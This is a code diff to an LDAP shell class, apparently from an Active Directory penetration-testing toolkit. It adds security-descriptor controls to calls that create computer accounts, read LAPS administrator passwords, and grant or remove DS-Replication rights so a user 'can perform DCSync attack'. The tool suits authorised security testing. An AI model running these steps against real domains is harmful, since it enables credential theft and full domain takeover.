@@ -239,7 +239,7 @@ class LdapShell(cmd.Cmd):
             'unicodePwd': '"{}"'.format(password).encode('utf-16-le')
         }
 
-        res = self.client.add(computer_dn, ['top', 'person', 'organizationalPerson', 'user', 'computer'], ucd)
+        res = self.client.add(computer_dn, ['top', 'person', 'organizationalPerson', 'user', 'computer'], ucd, security_descriptor_control(sdflags=0x04))
 
         if not res:
             if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
@@ -547,7 +547,7 @@ class LdapShell(cmd.Cmd):
                 return
             else:
                 for e in self.client.entries:
-                    print (e['sAMAccountName'], e['ms-MCS-AdmPwd'])
+                    print(e['sAMAccountName'], e['ms-MCS-AdmPwd'])
         else:
             self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(args[0])})',
                                attributes=['ms-MCS-AdmPwd'])
@@ -630,7 +630,7 @@ class LdapShell(cmd.Cmd):
 
         ldap_attribute = 'nTSecurityDescriptor'
         target_dn = self.domain_dumper.root
-        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=None)
+        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=security_descriptor_control(sdflags=0x04))
 
         if len(self.client.entries) <= 0:
             raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
@@ -650,9 +650,9 @@ class LdapShell(cmd.Cmd):
         sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes
         sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='89e95b76-444d-4c62-991a-0facbeda640c')) #set DS-Replication-Get-Changes-In-Filtered-Set
 
-        if len(sd['Dacl'].aces) > 0 or ldap_attribute == 'nTSecurityDescriptor':
+        if len(sd['Dacl'].aces) > 0:
             attr_values.append(sd.getData())
-        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]})
+        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))
 
         if self.client.result['result'] == 0:
             log.info('DACL modified successfully! %s now has DS-Replication privilege and can perform DCSync attack!', user_name)
@@ -673,7 +673,7 @@ class LdapShell(cmd.Cmd):
 
         ldap_attribute = 'nTSecurityDescriptor'
         target_dn = self.domain_dumper.root
-        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=None)
+        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=security_descriptor_control(sdflags=0x04))
 
         if len(self.client.entries) <= 0:
             raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')
@@ -705,7 +705,7 @@ class LdapShell(cmd.Cmd):
 
         if len(sd['Dacl'].aces) > 0 or ldap_attribute == 'nTSecurityDescriptor':
             attr_values.append(sd.getData())
-        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]})
+        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))
 
         if self.client.result['result'] == 0:
             log.info('DACL modified successfully! %s now has no DS-Replication privilege.', user_name)
